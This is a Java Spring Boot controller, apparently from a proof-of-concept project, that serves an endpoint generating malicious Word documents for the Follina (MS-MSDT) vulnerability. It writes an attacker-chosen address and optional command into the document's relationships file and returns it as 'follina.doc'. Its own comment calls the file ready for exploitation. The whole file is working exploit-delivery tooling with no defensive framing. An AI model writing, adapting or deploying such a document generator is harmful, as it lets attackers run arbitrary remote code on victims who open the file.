package io.github.dsibilio.follina.web;

import java.io.IOException;
import java.net.URI;
import java.nio.file.FileSystem;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.HashMap;
import java.util.Map;

import javax.servlet.http.HttpServletResponse;

import org.springframework.core.io.ClassPathResource;
import org.springframework.core.io.PathResource;
import org.springframework.core.io.Resource;
import org.springframework.http.MediaType;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class WordDocController {

    private static final String FOLLINA_TEMPLATE = "doc-template/follina.zip";
    private static final String DOC_RELS_LOCATION = "word/_rels/document.xml.rels";
    private static final String ADDRESS_TEMPLATE = "%s/index.html";
    private static final String DYNAMIC_ADDRESS_TEMPLATE = ADDRESS_TEMPLATE + "?cmd=%s";

    /**
     * Endpoint for generation of Follina Word documents
     * 
     * @param address the payload source/activator eg. http://localhost:8080
     * @param cmd     the optional dynamic payload to be passed via query param,
     *                if specified overrides the follina.payload property
     * @return the Word document ready for MS-MSDT Follina exploitation
     * @throws IOException
     */
    @GetMapping(path = "/generateDoc", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
    public Resource generateDoc(
            @RequestParam String address,
            @RequestParam(required = false) String cmd,
            HttpServletResponse response)
            throws IOException {

        Path tmpDir = Files.createTempDirectory("follina-doc");
        Path zipTemplate = classpathResourceToPath(FOLLINA_TEMPLATE);
        Path finalZip = Files.copy(zipTemplate, tmpDir, StandardCopyOption.REPLACE_EXISTING);

        String target = StringUtils.hasText(cmd) ? String.format(DYNAMIC_ADDRESS_TEMPLATE, address, cmd)
                : String.format(ADDRESS_TEMPLATE, address);
        updateDocRels(target, finalZip);

        response.setHeader("Content-Disposition", "attachment; filename=\"follina.doc\"");
        return new PathResource(finalZip);
    }

    private static Path classpathResourceToPath(String classpathPath) throws IOException {
        return Paths.get(new ClassPathResource(classpathPath).getURI());
    }

    private static void updateDocRels(String target, Path finalZip) throws IOException {
        Map<String, String> env = new HashMap<>();
        env.put("create", "false");

        URI uri = URI.create("jar:" + finalZip.toUri());
        try (FileSystem zipFs = FileSystems.newFileSystem(uri, env)) {
            Path docRels = zipFs.getPath(DOC_RELS_LOCATION);
            String finalDocRels = String.format(new String(Files.readAllBytes(docRels)), target);
            Files.write(docRels, finalDocRels.getBytes());
        }
    }

}
